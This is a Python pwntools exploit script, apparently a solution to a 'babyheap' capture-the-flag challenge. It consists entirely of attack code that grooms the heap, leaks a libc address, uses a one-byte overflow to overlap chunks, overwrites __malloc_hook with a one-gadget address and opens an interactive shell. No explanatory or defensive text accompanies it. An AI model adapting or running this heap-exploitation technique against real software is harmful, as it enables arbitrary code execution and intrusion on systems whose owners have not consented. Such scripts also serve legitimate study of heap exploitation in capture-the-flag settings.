from pwn import *

target = process('./babyheap')
# gdb.attach(target, gdbscript='pie b *0x147b')
libc = ELF('libc.so')

def ri():
    print(target.recvuntil('>'))

def malloc(content, size, new=0):
    ri()
    target.sendline('M')
    ri()
    target.sendline(str(size))
    ri()
    if new == 0:
        target.sendline(content)
    else:
        target.send(content)

def free(index):
    ri()
    target.sendline('F')
    ri()
    target.sendline(str(index))

def show(index):
    ri()
    target.sendline('S')
    ri()
    target.sendline(str(index))

for i in range(10):
    malloc(str(i)*0xf8, 0xf8)

for i in range(9, -1, -1):
    free(i)

for i in range(8):
    malloc('', 0xf8)

malloc('15935728', 0xf8)

ri()
target.sendline('S')
ri()
target.sendline('8')
target.recvuntil("15935728")
leak = target.recvline().replace(b"\x0a", b"")
leak = u64(leak + b"\x00"*(8-len(leak)))
libcBase = leak - 0x1e4ca0
print("libc base: " + hex(libcBase))
for i in range(8, -1, -1):
    free(i)

malloc("1"*8, 0x8)
malloc("2"*8, 0x8)
free(0)
free(1)
malloc('3'*8, 0x8)
malloc('4'*0xf8 + "\x81", 0xf8)
free(0)
malloc(b'1'*0x100 + p64(libcBase + libc.sym["__malloc_hook"])[:6], 0x174)
malloc("15935728", 0x10)
onegadget = libcBase + 0xe2383
malloc(p64(onegadget)[:6], 0x10)
target.sendline('M')
target.sendline("10")
target.interactive()
